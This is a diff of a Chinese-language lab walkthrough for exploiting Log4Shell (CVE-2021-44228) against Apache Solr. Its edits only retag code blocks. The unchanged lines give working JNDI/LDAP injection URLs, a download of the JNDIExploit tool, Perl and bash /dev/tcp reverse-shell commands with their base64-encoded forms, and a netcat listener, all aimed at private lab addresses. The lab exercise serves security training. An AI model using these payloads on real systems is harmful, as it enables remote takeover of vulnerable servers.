@@ -42,7 +42,7 @@ CVE-2021-44228，又名 Log4Shell，是 Apache Log4j2 日志组件中被发现�
 
 在浏览器中访问以下 URL：
 
-```
+```text wrap
 http://192.168.197.88:8983/solr/admin/cores?action=${jndi:ldap://bu74sz.dnslog.cn}
 ```
 
@@ -64,7 +64,7 @@ Log4j2 允许在日志信息中使用 \${} 语法动态插入运行时值，�
 攻击者正是看中了这一点，构造恶意输入，将 \${jndi:ldap:\//攻击者IP/恶意类} 这类字符串注入到应用日志中。Log4j2 在记录日志时，会解析 ${} 表达式并触发 JNDI 查询，导致服务器主动去连接攻击者搭建的恶意 LDAP 服务。
 
 完整的攻击链路如下：
-```
+```text wrap
 用户可控输入（包含恶意 ${jndi:...}）
          ↓
 应用调用 logger.info() 记录该输入
@@ -122,7 +122,7 @@ sequenceDiagram
 
 **Step 1：在攻击机（Kali）上启动 Netcat 监听**
 
-```
+```text wrap
 nc -lvnp 4444
 ```
 
@@ -132,7 +132,7 @@ nc -lvnp 4444
 
 推荐使用 JNDIExploit 工具：
 
-```
+```text wrap
 # 下载JNDIExploit，请直接在物理机的浏览器中粘贴（开代理），然后拖到kali中
 https://bit.ly/3Azqvnq
 
@@ -143,7 +143,7 @@ wget https://bit.ly/3Azqvnq -O JNDIExploit-1.2-SNAPSHOT.jar
 **Step 3：启动恶意 LDAP 服务**
 
 由于在新版kali不能下载Java 8，因此使用docker，并将JNDIExploit挂载到docker容器中。
-```
+```text wrap
 # 拉取 OpenJDK 8 镜像
 docker pull eclipse-temurin:8-jdk
 
@@ -168,7 +168,7 @@ docker run --rm -it \
 经过事后分析，发现这里构造反弹 Shell Payload可以选/bin/bash和perl两种，这里先选用perl。
 
 为什么？因为执行下面的命令检查，发现只有/bin/bash和perl可用，其他的例如python在docker环境中都没有，因此不可用，当然在实际环境中可用的手段会更多。
-```
+```text wrap
 ls -l /bin/sh /bin/bash /bin/dash
 which nc
 which python3 python
@@ -183,12 +183,12 @@ which perl
 >- perl（Practical Extraction and Reporting Language）：一种成熟的编程语言。它自带强大的 Socket（套接字）库，可以不依赖 Shell 语法，直接用代码建立网络连接。
 
 反弹 Shell 命令需要进行 **Base64 编码**：
-```
+```text wrap
 printf '%s' "perl -e 'use Socket;\$i=\"192.168.197.10\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\")};'" | base64
 ```
 ![](images/Pasted%20image%2020260909211613.png)
 得到编码后的字符串：
-```
+```text wrap
 cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xOTcuMTAiOyRwPTQ0NDQ7c29ja2V0KFMs
 UEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxz
 b2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RE
@@ -198,7 +198,7 @@ T1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIil9Oyc=
 **Step 5：向靶机发送攻击 Payload**
 
 在浏览器中访问，此时要注意，因为‘+’和‘=’会在传输中被转义成空格，因此需要进行url编码，变成下面的形式后，再访问：
-```
+```text wrap
 http://192.168.197.88:8983/solr/admin/cores?action=${jndi:ldap://192.168.197.10:1389/Basic/Command/Base64/cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xOTcuMTAiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI%2BJlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIil9Oyc%3D}
 ```
 ![](images/Pasted%20image%2020260909211948.png)
@@ -214,7 +214,7 @@ http://192.168.197.88:8983/solr/admin/cores?action=${jndi:ldap://192.168.197.10:
 **补充：**
 
 也可以用下面的/bin/bash反弹命令。
-```
+```text wrap
 # 原始反弹命令
 bash -c "bash -i >& /dev/tcp/192.168.197.10/4444 0>&1"
 
@@ -224,7 +224,7 @@ echo -n 'bash -c "bash -i >& /dev/tcp/192.168.197.10/4444 0>&1"' | base64
 
 得到编码串：YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMC80NDQ0IDA+JjEi，拼进 JNDI 表达式并对整段做 URL 编码后，最终访问：
 
-```
+```text wrap
 http://192.168.197.88:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F192.168.197.10%3A1389%2FBasic%2FCommand%2FBase64%2FYmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMC80NDQ0IDA%2BJjEi%7D
 ```
 
@@ -234,7 +234,7 @@ http://192.168.197.88:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F192
 
 2.**临时缓解措施**：若无法立即升级，可通过JVM参数禁用Lookup功能：
 
-```
+```text wrap
 -Dlog4j2.formatMsgNoLookups=true
 ```
 
